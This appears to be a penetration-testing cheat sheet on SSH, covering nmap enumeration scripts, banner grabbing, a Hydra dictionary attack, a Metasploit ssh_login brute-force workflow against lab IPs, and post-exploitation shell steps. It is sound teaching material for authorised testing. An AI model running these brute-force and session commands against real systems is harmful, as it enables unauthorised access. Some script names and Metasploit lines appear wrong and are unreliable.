🐚 SSH Enumeration
SSH (Secure Shell) is a network protocol used to securely access and manage remote systems over an unsecured network. 
It operates over TCP port 22 by default but can be configured to use different ports for increased security. 
It is widely used to administer servers and transfer data securely over networks.

SSH: Nmap Enumeration Scripts
ssh-auth-methods - Identifies the authentication methods supported by the SSH server.
> nmap --script ssh-auth-methods -p 22 target-ip

ssh-brute - Performs a brute-force attack on SSH credentials using a list of usernames and passwords.
> nmap --script ssh-brute -p 22 target-ip

ssh-enum-algos - Enumerates the cryptographic algorithms supported by the SSH server.
> nmap --script ssh-enum-algos -p 22 target-ip

ssh-hostkey - Retrieves and displays the public SSH host keys for the target server.
> nmap --script ssh-hostkey -p 22 target-ip

ssh-vuln-cve2018-15473 - Checks for the SSH vulnerability identified by CVE-2018-15473, which allows attackers to enumerate valid usernames.
> nmap --script ssh-vuln-cve2018-15473 -p 22 target-ip

ssh2-enum-algos - Lists the algorithms used in SSH connections.
> nmap --script ssh2-enum-algos -p 22 target-ip

ssh-dss - Checks for the use of DSS (Digital Signature Standard) keys in SSH.
> nmap --script ssh-dss -p 22 target-ip

nc 22: This command uses the Netcat utility to connect to the specified target on port 22, commonly used for SSH communication. 
This process is also known as “Banner Grabbing.”

Banner Grabbing is a technique used to gather information about a service running on a specific port, such as the version of the software and the operating system.

SSH: SSH Dictionary Attack
This command uses Hydra to perform a brute-force attack on the SSH service of the target machine using the specified username and 
the rockyou.txt wordlist for password guessing. Hydra will try each password from the rockyou.txt file to find a match for the given username.
> hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> ssh

This command scans the specified target for the SSH service on port 22 and employs Nmap’s “ssh-brute” script to perform a 
brute-force attack using the “admin” username. This script will attempt to guess the password for the admin user by trying a variety of passwords.
> nmap <target> -p 22 --script ssh-brute --script-args userdb=admin

♦ SSH Enumeration and Brute-Force Login (Metasploit)

Secure Shell → Enumeration. Post 22         # SSH Port
ifconfig → 192.30.120.2                     # Your local IP address
target IP → 192.30.120.3                    # The target machine's IP address

→ service postgresql Start                  # Start the required database service for Metasploit
→ msfconsole                                # Start the Metasploit Framework console
→ workspace -a SSH_Enum                     # Create and switch to a Metasploit workspace
→ setg RHOSTS 192.30.120.3                  # Globally set the target IP
→ setg RHOST 192.30.120.3                   # Globally set the target IP

♦ SSH Version Scanning
→ search type:auxiliary name:ssh            # Search for SSH-related auxiliary modules
→ Use auxiliary/scanner/ssh/ssh_version     # Load the SSH version scanner module
→ show options                              # View required options
→ run                                       # Execute the module

♦ SSH User Enumeration (Optional Step)
→ Search ssh_enumusers                      # Search for user enumeration module
→ Use type:auxiliary name:ssh               # Load the module (e.g., auxiliary/scanner/ssh/ssh_enumusers)
→ Set USER_FILE /usr/.../common_users.txt   # Set the path to the username list
→ run                                       # Execute the module

♦ SSH Login Brute-Force
→ Search openssh / Search type:auxiliary name:ssh            # Search for the login module
→ Use auxiliary/scanner/ssh/ssh_login                        # Load the SSH login brute-forcer module
→ Show options                                               # View required options
→ Set USER_FILE /usr/.../Common_users.txt                    # Set the path to the username list
→ Set PASS_FILE /usr/.../Common_passwords.txt                # Set the path to the password list
→ run                                                        # Execute the brute-force attack

♦ Post-Exploitation Session Management
→ sessions                                   # List active Meterpreter/shell sessions
→ sessions -i 1                              # Interact with the specified session ID (e.g., 1)
→ ls                                         # List files in the current directory (within the shell)
→ /bin/bash -i                               # Attempt to spawn an interactive Bash shell
→ ls                                         # List files in the current directory 
→ whoami                                     # Check the current user in the shell
→ exit / y                                   # Exit the shell session
